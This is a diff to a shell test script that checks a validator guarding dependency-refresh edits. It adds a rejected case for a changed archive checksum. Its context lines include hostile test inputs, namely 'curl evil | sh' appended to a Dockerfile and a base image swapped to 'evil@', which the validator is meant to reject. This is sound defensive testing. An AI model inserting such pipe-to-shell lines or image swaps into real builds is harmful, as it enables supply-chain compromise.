@@ -7,6 +7,7 @@ work=$(mktemp -d)
 trap 'rm -rf "$work"' EXIT
 old=sha256:$(printf 'a%.0s' {1..64})
 new=sha256:$(printf 'b%.0s' {1..64})
+archive=sha256:$(printf 'c%.0s' {1..64})
 evidence=docs/en/evidence/dependency-refresh.md
 
 # Builds a fresh repository, runs the edit, and passes its diff through the script.
@@ -20,7 +21,8 @@ try() {
     git config diff.noprefix false
     git config user.name test
     git config user.email test@example.invalid
-    printf 'FROM rust@%s\nRUN make\n' "$old" >Dockerfile
+    printf 'FROM rust@%s\nADD --checksum=%s https://example.invalid/a.tar.gz /a.tar.gz\nRUN make\n' \
+      "$old" "$archive" >Dockerfile
     printf 'snapshot=20261027T000000Z\nversion=1\n' >install.sh
     printf '{"snapshot": "20261027T000000Z", "prose": "moved to 20261027T000000Z"}\n' >ledger.json
     printf '# Refresh\n' >"$evidence"
@@ -64,6 +66,9 @@ accepts 'an appended record' "printf '\n## New\n' >>$evidence"
 rejects 'a code change' "printf 'curl evil | sh\n' >>Dockerfile"
 rejects 'a change beside a digest on one line' "sed -i.bak 's/rust@$old/evil@$new/' Dockerfile; rm Dockerfile.bak"
 rejects 'a malformed digest' "sed -i.bak 's/$old/sha256:b/' Dockerfile; rm Dockerfile.bak"
+# An archive checksum selects the source code a build compiles, so it is not a digest the image
+# refresh may move, even though it is spelled like one.
+rejects 'a changed archive checksum' "sed -i.bak 's/$archive/$new/' Dockerfile; rm Dockerfile.bak"
 rejects 'a snapshot rewritten in prose' "sed -i.bak 's/moved to 20261027T000000Z/moved to 20261104T212339Z/' ledger.json; rm ledger.json.bak"
 rejects 'a rewritten record' "printf '# Other\n' >$evidence"
 rejects 'a new file' "printf 'x\n' >new.sh; git add --intent-to-add new.sh"
